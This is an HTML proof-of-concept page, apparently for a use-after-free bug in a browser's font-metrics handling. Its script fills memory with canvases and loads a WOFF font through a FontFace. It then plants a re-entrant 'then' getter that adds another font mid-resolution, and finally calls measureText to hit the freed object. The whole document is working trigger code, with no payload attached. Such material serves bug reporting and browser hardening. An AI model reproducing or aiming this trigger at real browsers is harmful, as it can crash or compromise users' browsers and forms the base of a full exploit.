
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>PoC Mínima - FontMetrics UAF</title>
</head>
<body>
<script>
var uid = 0;
var dummyId = 0;
var alive = [];

function addDummies(n) {
    for (var i = 0; i < n; i++) {
        var d = document.createElement('canvas');
        d.width = 1; 
        d.height = 1;
        d.getContext('2d').font = '10px "Z' + (dummyId++) + '"';
        alive.push(d);
    }
}

function makeCtx(font) {
    var c = document.createElement('canvas');
    c.width = 64; 
    c.height = 64;
    c.style.cssText = 'position:absolute;left:-9999px';
    document.body.appendChild(c);
    var ctx = c.getContext('2d');
    ctx.font = font;
    alive.push(c);
    return ctx;
}

fetch('resources/Ahem.woff')
    .then(function(r) { return r.arrayBuffer(); })
    .then(function(b) {
        return new Promise(function(res, rej) {
            var fr = new FileReader();
            fr.onload  = function(e) { res(e.target.result); };
            fr.onerror = rej;
            fr.readAsDataURL(new Blob([b], { type: 'font/woff' }));
        });
    })
    .then(function(dataUrl) {
        addDummies(500);

        var id = uid++;
        var face = new FontFace('BF' + id, 'url("' + dataUrl + '")');
        document.fonts.add(face);
        void face.loaded;
        alive.push(face);

        var reen = false;
        Object.defineProperty(face, 'then', {
            configurable: true,
            get: function() {
                if (reen) return undefined;
                reen = true;
                document.fonts.add(new FontFace('U' + (uid++), 'local("x")'));
                reen = false;
                return undefined;
            }
        });

        var ctx = makeCtx('10px Times, BF' + id);
        ctx.measureText('\u13A0\u13A2\u13A4');
    })
    .catch(function(e) {
        // Silencioso em caso de erro de fetch
    });
</script>
</body>
</html>
